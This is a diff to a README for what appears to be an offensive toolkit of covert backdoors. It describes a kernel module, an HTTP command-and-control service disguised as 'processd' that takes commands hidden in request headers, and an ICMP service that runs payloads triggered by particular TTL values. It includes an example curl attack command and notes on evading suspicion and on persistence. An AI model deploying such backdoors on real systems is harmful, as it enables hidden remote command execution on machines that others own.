@@ -17,7 +17,18 @@ This is a kernel module that when installed will block HTTP requests for X minut
 
 ## HTTP C2
 
-Creates a process called processd that runs a program that listens for commands hidden in the headers of an HTTP request
+Creates a service called processd that runs a program that listens for commands hidden in the headers of an HTTP request
 
 Example Attack:
 `curl $VICTIM_IP -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" -H "Cookie: $CMD" -H "Upgrade-Insecure-Requests: $RETURN_PORT" > /dev/null 2>&1`
+
+## ICMP C2
+
+Creates a service called icmp that "replaces" the kernels responses to icmp echo requests with its own. It will respect the contents of the `net.ipv4.icmp_echo_ignore_all`.
+
+If IP packet has a ttl of 45, 65, 31, or 17, the service will execute the payload and the response will be the output of the command.
+
+<!-- TODO: 
+- Should make the code timeout and send decoy response to avoid suspicion -->
+
+Multithreading and restart on failure added for persistence.
